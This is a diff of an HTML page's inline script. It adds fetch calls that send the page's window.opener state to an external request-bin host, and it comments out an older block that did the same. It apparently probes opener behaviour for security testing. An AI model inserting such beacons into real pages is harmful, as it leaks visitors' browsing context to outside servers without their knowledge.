@@ -5,6 +5,13 @@
 <script>
 
 
+if (opener) {
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener' + opener, {mode: 'no-cors'})
+} else {
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?noOpener=', {mode: 'no-cors'})
+}
+
+/*
 try{
 	var aa = window.opener;
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener1=' + aa, {mode: 'no-cors'})
@@ -30,7 +37,7 @@ try{
 }
 
 
-
+*/
 
 
 /*
